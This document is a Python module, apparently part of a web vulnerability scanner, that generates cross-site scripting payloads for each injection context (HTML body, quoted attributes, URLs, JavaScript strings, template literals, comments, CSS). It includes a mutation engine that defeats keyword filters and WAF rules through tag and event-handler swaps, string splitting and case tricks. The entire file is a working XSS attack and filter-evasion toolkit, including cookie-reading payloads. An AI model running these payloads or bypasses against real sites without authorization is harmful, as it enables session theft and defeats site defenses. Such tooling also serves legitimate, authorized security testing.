"""XSS payload generation — context-aware base payloads + mutation engine.

Fed by the detection layer (``_xss_detection``):

  - ``_generate_payloads_for_context`` builds targeted payloads from
    context type + char filters + keyword filters + WAF blocks.
  - ``_apply_mutations`` derives bypass payloads when keyword filters
    block common functions / tags / events.
"""

from __future__ import annotations


def _mutate_function(payload, kw_allowed):
    """Replace blocked function names with alternatives."""
    mutations = []

    if not kw_allowed.get("alert", True):
        alternatives = [
            ("alert(1)", "confirm(1)"),
            ("alert(1)", "prompt(1)"),
            ("alert(1)", "print(1)"),
            ("alert(1)", "top['al'+'ert'](1)"),
            ("alert(1)", "window['alert'](1)"),
            ("alert(1)", "self['ale'+'rt'](1)"),
            ("alert(1)", "[1].find(alert)"),
            ("alert(1)", "alert?.()"),
            ("alert(document.cookie)", "confirm(document.cookie)"),
            ("alert(document.cookie)", "prompt(document.cookie)"),
        ]
        for old, new in alternatives:
            if old in payload:
                mutations.append(payload.replace(old, new))
    return mutations


def _mutate_tag(payload, kw_allowed):
    """Replace blocked tags with alternative tags."""
    mutations = []

    if not kw_allowed.get("script", True):
        if "<script>" in payload.lower():
            mutations.extend(
                [
                    payload.replace("<script>", "<ScRiPt>").replace(
                        "</script>", "</ScRiPt>"
                    ),
                    payload.replace("<script>", "<scr<script>ipt>").replace(
                        "</script>", "</scr</script>ipt>"
                    ),
                ]
            )

    if not kw_allowed.get("img", True):
        if "<img " in payload.lower():
            tag_alternatives = [
                ("<img ", "<video "),
                ("<img ", "<audio "),
                ("<img ", "<input "),
                ("<img ", "<body "),
                ("<img ", "<details open "),
                ("<img ", "<embed "),
            ]
            for old, new in tag_alternatives:
                mutations.append(
                    payload.replace(old, new).replace(
                        "src=x onerror",
                        "src=x onerror"
                        if "video" not in new and "audio" not in new
                        else "autoplay onplay",
                    )
                )

    if not kw_allowed.get("svg", True):
        if "<svg" in payload.lower():
            mutations.append(
                payload.lower()
                .replace("<svg", "<math")
                .replace("onload", "onmouseover")
            )

    return mutations


def _mutate_event(payload, kw_allowed):
    """Replace blocked event handlers."""
    mutations = []
    event_alternatives = {
        "onerror": [
            "onload",
            "onfocus",
            "onmouseover",
            "onclick",
            "oninput",
            "onchange",
            "ontoggle",
        ],
        "onload": [
            "onfocus",
            "onmouseover",
            "onerror",
            "onclick",
            "onanimationstart",
            "ontransitionend",
        ],
        "onfocus": [
            "onmouseover",
            "onclick",
            "oninput",
            "onblur",
            "onkeydown",
        ],
    }

    for blocked_event, alternatives in event_alternatives.items():
        if not kw_allowed.get(blocked_event, True):
            for alt in alternatives:
                if kw_allowed.get(alt, True) and blocked_event in payload:
                    mutations.append(payload.replace(blocked_event, alt))

    return mutations


def _apply_mutations(payloads, kw_allowed):
    """Apply all mutation strategies to generate bypass payloads."""
    mutated = []
    seen = set()

    for p in payloads:
        for m in _mutate_function(p, kw_allowed):
            if m not in seen:
                seen.add(m)
                mutated.append(m)

        for m in _mutate_tag(p, kw_allowed):
            if m not in seen:
                seen.add(m)
                mutated.append(m)

        for m in _mutate_event(p, kw_allowed):
            if m not in seen:
                seen.add(m)
                mutated.append(m)

    return mutated


# ══════════════════════════════════════════
# CONTEXT-AWARE PAYLOAD GENERATION
# ══════════════════════════════════════════

def _generate_payloads_for_context(ctx_type, ctx_info, allowed, kw_allowed, waf_blocks):
    """Generate targeted XSS payloads based on context + filters + keywords + WAF."""
    payloads = []

    if ctx_type == "HTML_BODY":
        has_tags = allowed.get("lt") and allowed.get("gt")
        has_parens = allowed.get("lparen") and allowed.get("rparen")
        has_backtick = allowed.get("backtick")

        # Check if we are trapped inside a bad tag
        bad_tag_prefix = ""
        if "bad_tag" in ctx_info:
            bad_tag_prefix = f"</{ctx_info['bad_tag']}>"

        if has_tags:
            tags_events = []

            if kw_allowed.get("img", True):
                tags_events.append(
                    (f"{bad_tag_prefix}<img src=x {{event}}={{func}}>", "onerror")
                )
            if kw_allowed.get("svg", True):
                tags_events.append(
                    (f"{bad_tag_prefix}<svg {{event}}={{func}}>", "onload")
                )
                tags_events.append((f"{bad_tag_prefix}<svg/onload={{func}}>", "onload"))

            tags_events.extend(
                [
                    (f"{bad_tag_prefix}<details open {{event}}={{func}}>", "ontoggle"),
                    (
                        f"{bad_tag_prefix}<input {{event}}={{func}} autofocus>",
                        "onfocus",
                    ),
                    (f"{bad_tag_prefix}<marquee {{event}}={{func}}>", "onstart"),
                    (f"{bad_tag_prefix}<body {{event}}={{func}}>", "onload"),
                    (
                        f"{bad_tag_prefix}<video src=x autoplay {{event}}={{func}}>",
                        "onplay",
                    ),
                    (
                        f"{bad_tag_prefix}<audio src=x autoplay {{event}}={{func}}>",
                        "onplay",
                    ),
                    (
                        f"{bad_tag_prefix}<select {{event}}={{func}} autofocus>",
                        "onfocus",
                    ),
                ]
            )

            if kw_allowed.get("script", True):
                if not waf_blocks.get("tag_close"):
                    tags_events.insert(
                        0, (f"{bad_tag_prefix}<script>{{func}}</script>", None)
                    )

            # WAF Syntax filters
            if waf_blocks.get("event_handler"):
                tags_events = [t for t in tags_events if t[1] is None]

            if waf_blocks.get("tag_space"):
                new_te = []
                for template, ev in tags_events:
                    t_mod = template.replace(" {event}=", "/{event}=")
                    new_te.append((t_mod, ev))
                tags_events = new_te

            functions = []
            if has_parens:
                if kw_allowed.get("alert", True):
                    functions.extend(["alert(1)", "alert(document.cookie)"])
                else:
                    functions.extend(
                        [
                            "confirm(1)",
                            "prompt(1)",
                            "top['al'+'ert'](1)",
                            "window['alert'](1)",
                            "self['ale'+'rt'](1)",
                        ]
                    )
            elif has_backtick:
                if kw_allowed.get("alert", True):
                    functions.extend(["alert`1`"])
                else:
                    functions.extend(["confirm`1`", "prompt`1`"])
            else:
                functions.extend(
                    [
                        "location='javascript:alert%281%29'",
                        "location=name",
                        "throw 1",
                    ]
                )

            events_available = [
                e
                for e in [
                    "onerror",
                    "onload",
                    "onfocus",
                    "onmouseover",
                    "onclick",
                    "ontoggle",
                    "oninput",
                    "onstart",
                    "onplay",
                ]
                if kw_allowed.get(e, True)
            ]

            for template, default_event in tags_events:
                for func in functions[:3]:
                    if default_event is None:
                        p = template.replace("{func}", func)
                        payloads.append(p)
                    else:
                        event = default_event
                        if not kw_allowed.get(event, True):
                            event = (
                                events_available[0]
                                if events_available
                                else default_event
                            )
                        p = template.replace("{event}", event).replace("{func}", func)
                        payloads.append(p)

                    if len(payloads) >= 25:
                        break
                if len(payloads) >= 25:
                    break

        else:
            payloads.extend(
                [
                    f"{bad_tag_prefix}<ScRiPt>alert(1)</ScRiPt>",
                    f"{bad_tag_prefix}<IMG SRC=x onerror=alert(1)>",
                    f"{bad_tag_prefix}<svg/onload=alert(1)>",
                    f"{bad_tag_prefix}<<script>alert(1)//<</script>",
                    f"{bad_tag_prefix}<scr<script>ipt>alert(1)</scr</script>ipt>",
                    f"{bad_tag_prefix}\x3cscript\x3ealert(1)\x3c/script\x3e",
                    f"{bad_tag_prefix}%3cscript%3ealert(1)%3c/script%3e",
                ]
            )

    elif ctx_type == "ATTR_DOUBLE_QUOTE":
        if allowed.get("dquote"):
            base_payloads = [
                '"><script>alert(1)</script>',
                '"><img src=x onerror=alert(1)>',
                '" onfocus="alert(1)" autofocus="',
                '"><svg onload=alert(1)>',
                '" onmouseover="alert(1)" style="'
                'position:fixed;top:0;left:0;width:100%;height:100%" "',
                '" autofocus onfocus="alert(1)" "',
            ]
            payloads.extend(base_payloads)
        else:
            payloads.extend(
                [
                    " onfocus=alert(1) autofocus ",
                    " onmouseover=alert(1) ",
                    " autofocus onfocus=alert(1) ",
                ]
            )

    elif ctx_type == "ATTR_SINGLE_QUOTE":
        if allowed.get("squote"):
            payloads.extend(
                [
                    "' onfocus='alert(1)' autofocus='",
                    "'><script>alert(1)</script>",
                    "'><img src=x onerror=alert(1)>",
                    "' onmouseover='alert(1)' style='"
                    "position:fixed;top:0;left:0;width:100%;height:100%' '",
                ]
            )

    elif ctx_type == "ATTR_URL":
        payloads.extend(
            [
                "javascript:alert(1)",
                "javascript:alert(document.cookie)",
                "javascript:alert`1`",
                "data:text/html,<script>alert(1)</script>",
                "jAvAsCrIpT:alert(1)",
                "javascript:confirm(1)",
                " javascript:alert(1)",
                "&#106;avascript:alert(1)",
                "java\tscript:alert(1)",
                "javascript://%0aalert(1)",
            ]
        )
        if not kw_allowed.get("javascript", True):
            payloads.extend(
                [
                    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
                    "data:text/html,<script>alert(1)</script>",
                ]
            )
        if allowed.get("dquote") or allowed.get("squote"):
            payloads.extend(
                [
                    '"><script>alert(1)</script>',
                    "' onfocus='alert(1)' autofocus='",
                ]
            )

    elif ctx_type == "EVENT_HANDLER":
        if allowed.get("lparen"):
            payloads.extend(
                [
                    "alert(1)",
                    "alert(document.cookie)",
                    "confirm(1)",
                    "prompt(1)",
                ]
            )
            if not kw_allowed.get("alert", True):
                payloads.extend(
                    [
                        "confirm(1)",
                        "prompt(1)",
                        "top['al'+'ert'](1)",
                        "window['alert'](document.cookie)",
                    ]
                )
        else:
            payloads.extend(["alert`1`", "confirm`1`"])

    elif ctx_type == "JS_STRING_DOUBLE":
        if allowed.get("dquote"):
            payloads.extend(
                [
                    '";alert(1)//',
                    '";alert(1);"',
                    '"-alert(1)-"',
                    '";</script><script>alert(1)//',
                    '";alert(document.cookie)//',
                    '";confirm(1)//',
                ]
            )
            if not kw_allowed.get("alert", True):
                payloads.extend(
                    [
                        '";confirm(1)//',
                        '";prompt(1)//',
                        "\";top['al'+'ert'](1)//",
                    ]
                )
        payloads.append("</script><script>alert(1)//")

    elif ctx_type == "JS_STRING_SINGLE":
        if allowed.get("squote"):
            payloads.extend(
                [
                    "';alert(1)//",
                    "';alert(1);'",
                    "'-alert(1)-'",
                    "';</script><script>alert(1)//",
                    "';confirm(1)//",
                ]
            )
            if not kw_allowed.get("alert", True):
                payloads.extend(
                    [
                        "';confirm(1)//",
                        "';prompt(1)//",
                        "';top['al'+'ert'](1)//",
                    ]
                )
        payloads.append("</script><script>alert(1)//")

    elif ctx_type == "JS_TEMPLATE_LITERAL":
        payloads.extend(
            [
                "${alert(1)}",
                "${alert(document.cookie)}",
                "`-alert(1)-`",
                "`;alert(1)//",
                "${confirm(1)}",
                "${prompt(1)}",
            ]
        )

    elif ctx_type == "JS_CODE":
        payloads.extend(
            [
                "alert(1)",
                ";alert(1)//",
                "-alert(1)-",
                "alert(document.cookie)",
                ";confirm(1)//",
                ";prompt(1)//",
            ]
        )

    elif ctx_type == "HTML_COMMENT":
        if allowed.get("gt"):
            payloads.extend(
                [
                    "--><script>alert(1)</script><!--",
                    "--><img src=x onerror=alert(1)><!--",
                    "--><svg onload=alert(1)><!--",
                ]
            )

    elif ctx_type == "TAG_BARE":
        payloads.extend(
            [
                "onfocus=alert(1) autofocus",
                "onmouseover=alert(1)",
                "autofocus onfocus=alert(1)",
                "style=animation-name:x onanimationstart=alert(1)",
                "onclick=alert(1)",
            ]
        )
        if not kw_allowed.get("alert", True):
            payloads.extend(
                [
                    "onfocus=confirm(1) autofocus",
                    "onmouseover=prompt(1)",
                ]
            )

    elif ctx_type == "CSS_CONTEXT":
        payloads.extend(
            [
                "}</style><script>alert(1)</script>",
                "}</style><img src=x onerror=alert(1)>",
                "}</style><svg onload=alert(1)>",
            ]
        )

    return payloads
